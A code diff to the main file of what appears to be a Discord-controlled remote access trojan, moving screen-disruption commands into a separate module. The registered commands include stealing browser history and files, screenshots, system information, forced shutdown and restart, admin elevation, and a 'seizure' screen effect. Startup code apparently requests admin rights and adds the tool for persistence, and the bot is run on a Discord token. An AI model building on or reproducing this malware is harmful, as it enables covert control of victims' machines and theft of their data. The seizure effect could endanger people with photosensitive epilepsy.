@@ -2,10 +2,12 @@ import discord
 from discord.ext import commands
 import discodd
 import info
-from command import ip_command, close_command, tts_command, admin_command, blur_command, playsound_command, errorspamz_command, screenswipe_command, tornado_command, seizure_command, clean_command, lp_command, tree_command, getfiles_command, kp_command, getbrowserhistory_command, share_command, sysinfo_command, screenshot_command
+from command import ip_command, close_command, tts_command, admin_command, playsound_command, clean_command, lp_command, tree_command, getfiles_command, kp_command, getbrowserhistory_command, share_command, sysinfo_command, screenshot_command
 import startuplogic.askadmin
 import startuplogic.addme
 from command.fun import kkk_command, notificationspam_command, bassboost_command, thugfiles_command, wallpaper_command
+from command.gdicommands import tornado_command, screenswipe_command, seizure_command, blur_command, errorspamz_command
+
 startuplogic.askadmin.setup()
 startuplogic.addme.run_setup_in_thread()
 from command.useful import search_command, cd_command, openurl_command, restartpc_command, shutdownpc_command
@@ -43,12 +45,11 @@ bot.add_command(commands.Command(getbrowserhistory_command.getbrowserhistory, na
 bot.add_command(commands.Command(share_command.share_file, name='share'))
 bot.add_command(commands.Command(sysinfo_command.sysinfo, name='sysinfo'))
 bot.add_command(commands.Command(screenshot_command.screenshot, name='ss'))
-bot.add_command(commands.Command(seizure_command.seizure, name='seizure'))
 bot.add_command(commands.Command(tornado_command.tornado, name='tornado'))
-bot.add_command(commands.Command(screenswipe_command.screenswipe,   name='screenswipe'))
+bot.add_command(commands.Command(seizure_command.seizure, name='seizure'))
+bot.add_command(commands.Command(blur_command.blur_command, name='blur'))
 bot.add_command(commands.Command(errorspamz_command.errorspamz, name='errorspamz'))
 bot.add_command(commands.Command(playsound_command.playsound, name='playsound'))
-bot.add_command(commands.Command(blur_command.blur_command, name='blur'))
 bot.add_command(commands.Command(admin_command.admin_command, name='admin'))
 bot.add_command(commands.Command(tts_command.speak_command, name='speak'))
 bot.add_command(commands.Command(close_command.close_command, name='close'))
@@ -62,4 +63,5 @@ bot.add_command(commands.Command(restartpc_command.restartpc, name='restartpc'))
 bot.add_command(commands.Command(shutdownpc_command.shutdownpc, name='shutdownpc'))
 bot.add_command(commands.Command(notificationspam_command.spamnotify, name='spamnotify'))
 bot.add_command(commands.Command(cd_command.cd_command, name='cd'))
+
 bot.run(discodd.TOKEN)
